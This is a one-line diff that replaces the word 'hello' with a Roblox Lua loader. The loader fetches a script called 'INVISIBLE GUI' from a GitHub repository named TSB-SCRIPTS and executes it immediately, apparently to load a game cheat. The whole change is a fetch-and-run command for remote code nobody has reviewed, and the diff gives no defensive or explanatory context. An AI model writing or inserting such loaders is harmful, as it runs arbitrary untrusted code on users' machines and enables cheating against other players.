@@ -1,1 +1,1 @@
-hello
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Showcaser1/TSB-SCRIPTS/refs/heads/main/INVISIBLE%20GUI"))()
